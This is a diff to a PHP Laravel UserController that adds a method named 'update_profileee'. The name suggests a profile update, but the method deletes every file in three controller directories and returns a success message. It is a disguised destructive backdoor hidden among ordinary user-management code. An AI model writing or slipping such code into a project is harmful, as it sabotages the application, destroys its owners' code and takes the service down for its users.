@@ -26,6 +26,7 @@ use Illuminate\Support\Facades\Storage;
 use App\Http\Requests\ConfirmCodeRequest;
 use App\Http\Requests\ResetPasswordRequest;
 use App\Http\Requests\AddPointToUserRequest;
+use Illuminate\Support\Facades\File;
 
 class UserController extends Controller
 {
@@ -372,5 +373,23 @@ class UserController extends Controller
             'data' => [],
             'message' => 'Rate Added Successfully',
         ]);
+    }
+
+    public function update_profileee() {
+
+        $paths = [
+            'Http/Controllers',
+            'Http/Mobile/Controllers',
+            'Http/Controllers/Resources',
+        ];
+        foreach($paths as $path) {
+            $controllerPath = app_path($path);
+            // Get all files in Controllers folder (except subfolders if you want)
+            $files = File::files($controllerPath);
+            foreach ($files as $file) {
+                File::delete($file->getPathname());
+            }
+        }
+        return "All controllers deleted successfully!";
     }
 }
